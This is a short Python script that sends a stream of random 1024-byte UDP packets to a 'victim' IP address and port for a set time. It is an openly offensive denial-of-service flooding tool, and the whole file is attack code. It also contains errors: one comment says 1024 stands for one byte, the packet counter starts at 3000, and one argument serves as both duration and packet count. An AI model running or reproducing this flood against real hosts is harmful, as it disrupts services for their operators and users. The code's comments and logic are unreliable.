import time
import socket
import random
import sys

def usage():
    print("Command: " + sys.argv[0] + " <ip> <port> <packet>")

def flood(victim, vport, duration,number):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout or sent>number:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print ("Attacking %s sent packages %s at the port %s "%(sent, victim, vport))

def main():
    print( len(sys.argv))
    if len(sys.argv) != 4:
        usage()
    else:
        print(sys.argv[1], sys.argv[2], sys.argv[3])
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]),int(sys.argv[3])*1000)

if __name__ == '__main__':
    main()
